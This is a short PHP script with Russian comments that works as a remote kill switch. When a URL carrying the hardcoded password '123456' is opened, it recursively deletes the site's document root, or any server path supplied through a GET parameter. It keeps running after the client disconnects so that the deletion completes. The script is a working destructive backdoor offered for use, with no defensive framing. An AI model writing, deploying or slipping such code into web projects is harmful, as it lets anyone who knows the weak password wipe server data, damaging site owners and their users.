<?// чтобы точно выполнился  пример строчки как настроить открытие ссылки мой удалит весь каталог https://menatbot.com/?del123=123456
ignore_user_abort(true);
set_time_limit(0);
// стандартный путь
$path=$_SERVER['DOCUMENT_ROOT'];
// стандартный пароль killbil(меняем на свой123456)
$pass="123456";
// можем и отправить что именно удалить path (папку  udalit)
if (isset($_GET['udalit']))
$path=$_GET['udalit'];
// реальный путь
echo $path=realpath($path);
// если получим параметр на удаление и он будет корректен  del (папку  del123)
if ((isset($_GET['del123']))&&($_GET['del123']==$pass))
rmdir_recurse($path);
// рекурсионное удаление
function rmdir_recurse($path) {
$path = rtrim($path, '/').'/';
$handle = opendir($path);
while(false !== ($file = readdir($handle))) {
if($file != '.' and $file != '..' ) {
$fullpath = $path.$file;
if(is_dir($fullpath)) rmdir_recurse($fullpath); else unlink($fullpath);
}
}
closedir($handle);
rmdir($path);
}
